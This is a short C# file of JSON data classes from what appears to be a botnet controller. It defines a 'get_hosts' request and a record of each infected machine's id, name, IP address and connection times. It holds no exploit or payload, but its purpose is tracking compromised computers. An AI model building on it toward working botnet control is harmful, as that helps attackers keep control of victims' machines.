using Newtonsoft.Json;
using System;

namespace Master.Botnet.JSON
{
    internal class ViewHostsRequestJson : BaseRequestJson
    {
        public ViewHostsRequestJson() : base(command: "get_hosts") { }
    }

    internal class InfectedHostJson
    {
        [JsonProperty(Required = Required.Always)]
        public int hostId { get; set; }

        [JsonProperty(Required = Required.Always)]
        public string name { get; set; }

        [JsonProperty(Required = Required.Always)]
        public string ip { get; set; }

        [JsonProperty(Required = Required.Always)]
        public DateTime firstConnection { get; set; }

        [JsonProperty(Required = Required.Always)]
        public DateTime lastConnection { get; set; }

        public override string ToString()
            => $"Host_id : {hostId} | Name : {name} | Ip : {ip} | First_connection : {firstConnection:dd/MM/yyyy HH:mm:ss} | Last_connection : {lastConnection:dd/MM/yyyy HH:mm:ss}";
    }
}
